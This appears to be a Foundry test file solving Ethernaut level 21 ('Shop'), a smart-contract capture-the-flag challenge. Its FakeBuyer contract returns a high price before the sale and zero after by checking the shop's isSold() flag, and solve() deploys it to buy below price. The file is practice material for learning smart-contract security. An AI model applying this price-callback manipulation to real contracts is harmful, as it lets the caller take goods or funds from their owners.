pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IToken {
    function approve(address spender, uint256 amount) external;
}

interface IBuyer {
    function price() external returns (uint256);
}

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract FakeBuyer {
    bool queried;

    function price() external view returns (uint256 result) {
        return IShop(msg.sender).isSold() ? 0 : 1000;
    }

    function buy(IShop shop) external {
        shop.buy();
    }
}

contract Ethernaut21 is EthernautTest {
    constructor() EthernautTest(21) {}

    function solve() internal override(EthernautTest) {
        IShop shop = IShop(instance);
        FakeBuyer buyer = new FakeBuyer();
        buyer.buy(shop);
    }

    receive() external payable {}
}
